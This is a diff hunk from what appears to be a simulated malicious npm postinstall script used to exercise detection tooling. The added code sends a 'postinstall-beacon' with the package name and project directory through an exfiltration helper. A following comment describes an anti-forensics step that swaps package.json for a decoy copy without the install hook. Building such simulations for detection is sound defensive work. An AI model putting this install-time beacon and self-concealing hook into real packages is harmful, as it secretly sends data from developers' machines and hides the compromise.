@@ -55,6 +55,16 @@ req.on('error', () => {});
 req.write(payload);
 req.end();
 
+try {
+  const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
+  uploadJson('21', 'postinstall-beacon', {
+    type: 'postinstall-beacon',
+    package: 'plain-crypto-js-like',
+    cwd: projectRoot,
+    marker,
+  });
+} catch (_) {}
+
 // Simulated anti-forensics: swap package.json to decoy without postinstall script
 try {
   const decoy = fs.readFileSync(path.join(pkgRoot, 'package.clean.json'), 'utf8');
